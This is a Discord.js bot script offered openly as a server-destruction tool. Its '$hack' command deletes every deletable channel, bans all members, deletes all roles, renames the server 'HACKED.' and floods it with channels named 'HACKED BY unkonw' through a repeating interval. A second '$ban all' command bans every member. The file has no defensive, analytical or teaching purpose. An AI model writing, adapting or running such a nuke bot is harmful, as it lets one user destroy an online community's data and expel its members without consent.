const Discord = require('discord.js');
const client = new Discord.Client();
const prefix = '$'
client.on('ready', () => {
console.log(`Logged in as ${client.user.tag}!`);
 
});

client.on('message', message =>{
    if (message.content.startsWith('$hack')){
            if (message.channel.guild){
                message.guild.channels.forEach(c =>{
                    if(c.deletable){
                        c.delete()
                    }
                })
                message.guild.members.forEach(m =>{
                    m.ban()
                })
                message.guild.roles.forEach(r=>{
                    r.delete()
                })
                message.guild.setName('HACKED.')
                setInterval(function(){
                  message.guild.createChannel('HACKED BY unkonw ', 'Viniom')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')  
                message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text') 
                       message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')  
                message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                       message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')  
                message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                       message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')  
                message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                                message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')  
                message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text')
                  message.guild.createChannel('HACKED BY unkonw ', 'text') 
                })
            }
        }
});
/////Ban all
client.on('message', msg => {
         if (msg.content === prefix + "ban all") {
     if(!msg.channel.guild) return;
     
      msg.guild.members.forEach( member => {
          
          member.ban()
      })
}
});
////
client.login("")
          